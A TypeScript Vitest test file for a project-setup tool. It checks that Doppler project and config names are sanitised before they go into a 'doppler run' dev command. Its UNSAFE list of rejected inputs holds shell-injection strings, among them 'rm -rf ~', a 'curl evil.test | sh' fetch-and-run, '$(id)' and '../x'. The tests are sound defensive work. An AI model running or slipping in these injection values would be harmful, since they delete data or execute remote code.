import { describe, expect, it } from "vitest";
import {
  DevPreviewSettings,
  isPlainDopplerName,
  SECURE_FOUNDATION_NO_DEV_PREVIEW,
  SecureFoundationDevPreview,
  SecureFoundationName,
  SecureFoundationSetupRecord,
  secureFoundationCreates,
  secureFoundationDevPreview,
  secureFoundationDopplerProject,
  secureFoundationFolder,
  secureFoundationSetupRecord,
} from "../src/index";

const roundTrip = <T>(schema: { parse: (v: unknown) => T }, value: unknown): T =>
  schema.parse(JSON.parse(JSON.stringify(schema.parse(value))));

const AT = new Date("2026-01-05T10:00:00.000Z");
const doppler = (project: string, config = "dev") =>
  secureFoundationDevPreview({ secrets: "doppler", doppler: { project, config } });

/** Everything a shell gives a meaning to, and what would make a name an option or a path. */
const UNSAFE = [
  "my site",
  "my-site; rm -rf ~",
  "my-site && curl evil.test | sh",
  "$(id)",
  "`id`",
  "my-site|tee",
  "my-site>out",
  "my-site<in",
  "a'b",
  'a"b',
  "a\\b",
  "a\nb",
  "a\tb",
  "a*b",
  "a?b",
  "~root",
  "a/b",
  "../x",
  "$HOME",
  "a#b",
  "a!b",
  "a=b",
  "a,b",
  "a(b)",
  "a{b}",
  "a[b]",
  "--config=prd",
  "-x",
  ".hidden",
  "_x",
  "",
  " ",
  "é",
  "a".repeat(65),
];

describe("the Doppler project of a project name", () => {
  it("is made the way the template's install makes it", () => {
    // `scripts/setup.mjs doppler-bootstrap`: lower case, other runs one dash, no dash at the
    // ends, then the first 40 characters.
    const template = (name: string) =>
      name
        .toLowerCase()
        .replace(/[^a-z0-9]+/g, "-")
        .replace(/^-+|-+$/g, "")
        .substring(0, 40);
    const names = [
      "My Site",
      "  Acme   Shop 2 ",
      "a.b_c-d",
      "UPPER lower 123",
      "x",
      "9 lives",
      `${"a".repeat(39)} b`,
      `${"a".repeat(38)}  bcd`,
      "a".repeat(60),
      "one two three four five six seven eight nine ten eleven",
    ];
    for (const name of names) {
      expect(secureFoundationDopplerProject(name), name).toBe(template(name));
    }
  });

  it("can end in a dash where the folder's name can't: the install cuts last", () => {
    const name = `${"a".repeat(39)} b`;
    expect(secureFoundationDopplerProject(name)).toBe(`${"a".repeat(39)}-`);
    expect(secureFoundationFolder(name)).toBe("a".repeat(39));
    // What the form says is created names the Doppler project as the install will.
    const created = secureFoundationCreates({ name, secrets: "doppler" });
    expect(created.find((c) => c.service === "Doppler")?.item).toContain(`"${"a".repeat(39)}-"`);
  });

  it("is a plain name for every name the form takes", () => {
    for (const name of ["My Site", "a", "9", "A.B", "x_y", "a - b", `${"z".repeat(39)} q`]) {
      expect(SecureFoundationName.safeParse(name).success, name).toBe(true);
      expect(isPlainDopplerName(secureFoundationDopplerProject(name)), name).toBe(true);
    }
  });
});

describe("a plain Doppler name", () => {
  it("is letters, digits, dots, dashes and underscores, starting with a letter or digit", () => {
    for (const name of ["my-site", "dev", "prd", "dev_personal", "a.b", "A1", "9", "x-"]) {
      expect(isPlainDopplerName(name), name).toBe(true);
    }
  });

  it("is nothing a shell reads, no option and no path", () => {
    for (const name of UNSAFE) expect(isPlainDopplerName(name), JSON.stringify(name)).toBe(false);
    for (const value of [null, undefined, 7, {}, ["dev"]]) {
      expect(isPlainDopplerName(value)).toBe(false);
    }
  });
});

describe("what is kept about a setup", () => {
  it("is the secrets mode and, with Doppler, the project and config names", () => {
    const kept = secureFoundationSetupRecord({ name: "My Site", secrets: "doppler" }, AT);
    expect(kept).toEqual({
      secrets: "doppler",
      doppler: { project: "my-site", config: "dev" },
      createdAt: AT.toISOString(),
    });
    expect(roundTrip(SecureFoundationSetupRecord, kept)).toEqual(kept);
    const local = secureFoundationSetupRecord({ name: "My Site", secrets: "env_local" }, AT);
    expect(local.doppler).toBeNull();
    expect(roundTrip(SecureFoundationSetupRecord, local)).toEqual(local);
  });
});

describe("the dev preview of a Secure Foundation project", () => {
  it("with Doppler: the dev command names the project and the config", () => {
    const offer = doppler("my-site");
    expect(offer.settings).toEqual({
      command: "doppler run --project my-site --config dev -- npm run dev",
      prepareCommand: "npm ci",
      portVars: ["PORT"],
      urlFrom: "output",
      urlPattern: null,
      pmEnabled: false,
    });
    // The form takes exactly these values.
    expect(DevPreviewSettings.parse(offer.settings)).toEqual(offer.settings);
    expect(offer.secrets).toBe("doppler");
    expect(offer.notes.join(" ")).toContain("Doppler remembers them per folder");
    expect(offer.convex).toContain("`npm run convex:doppler`");
    expect(offer.convex).toContain("one Convex dev deployment");
    expect(roundTrip(SecureFoundationDevPreview, offer)).toEqual(offer);
  });

  it("writes no name into a command unless it is plain, and says why nothing is filled in", () => {
    for (const bad of UNSAFE) {
      for (const offer of [doppler(bad), doppler("my-site", bad)]) {
        expect(offer.applies).toBe(true);
        expect(offer.settings, JSON.stringify(bad)).toBeNull();
        expect(offer.notes).toHaveLength(1);
        expect(offer.notes[0]).toContain("isn't a plain name");
        // The name itself is not repeated anywhere.
        if (bad.trim().length > 3) expect(JSON.stringify(offer)).not.toContain(bad);
        expect(roundTrip(SecureFoundationDevPreview, offer)).toEqual(offer);
      }
    }
    // A Doppler setup whose names were never kept gets nothing either.
    expect(secureFoundationDevPreview({ secrets: "doppler", doppler: null }).settings).toBeNull();
  });

  it("only ever produces a command made of the fixed words and two plain names", () => {
    const names = ["my-site", "A.b_c-9", "x", ...UNSAFE];
    for (const project of names) {
      for (const config of ["dev", "prd", ...UNSAFE.slice(0, 6)]) {
        const command = doppler(project, config).settings?.command;
        if (command === undefined) continue;
        expect(command).toMatch(
          /^doppler run --project [A-Za-z0-9][A-Za-z0-9._-]{0,63} --config [A-Za-z0-9][A-Za-z0-9._-]{0,63} -- npm run dev$/,
        );
      }
    }
  });

  it("without Doppler: the plain dev command, and what the person has to copy", () => {
    const offer = secureFoundationDevPreview(
      { secrets: "env_local", doppler: null },
      { baseCheckout: "/home/dev-preview/base/my-site-12345678" },
    );
    expect(offer.settings).toEqual({
      command: "npm run dev",
      prepareCommand: "npm ci",
      portVars: ["PORT"],
      urlFrom: "output",
      urlPattern: null,
      pmEnabled: false,
    });
    expect(offer.secrets).toBe("env_local");
    const note = offer.notes.join(" ");
    expect(note).toContain("`.env.local`");
    expect(note).toContain("a preview's folder doesn't have it");
    expect(note).toContain("The app doesn't copy it");
    expect(note).toContain("`/home/dev-preview/base/my-site-12345678`");
    expect(offer.convex).toContain("`npm run convex`");
    expect(offer.convex).not.toContain("doppler");
    expect(roundTrip(SecureFoundationDevPreview, offer)).toEqual(offer);
    // Kept names are ignored in this mode: nothing of them reaches the command.
    const odd = secureFoundationDevPreview({
      secrets: "env_local",
      doppler: { project: "$(id)", config: "dev" },
    });
    expect(odd.settings?.command).toBe("npm run dev");
    expect(JSON.stringify(odd)).not.toContain("$(id)");
  });

  it("for a project made before anything was kept: the plain command and both ways on", () => {
    const offer = secureFoundationDevPreview(null);
    expect(offer.applies).toBe(true);
    expect(offer.secrets).toBeNull();
    expect(offer.settings?.command).toBe("npm run dev");
    expect(offer.settings?.prepareCommand).toBe("npm ci");
    expect(offer.notes.join(" ")).toContain(
      "`doppler run --project <your Doppler project> --config <your config> -- npm run dev`",
    );
    expect(offer.notes.join(" ")).toContain("`.env.local`");
    expect(offer.convex).toContain("`npm run convex:doppler`");
    expect(roundTrip(SecureFoundationDevPreview, offer)).toEqual(offer);
  });

  it("is nothing for another project or another device", () => {
    expect(roundTrip(SecureFoundationDevPreview, SECURE_FOUNDATION_NO_DEV_PREVIEW)).toEqual({
      applies: false,
      secrets: null,
      settings: null,
      notes: [],
      convex: null,
    });
  });
});
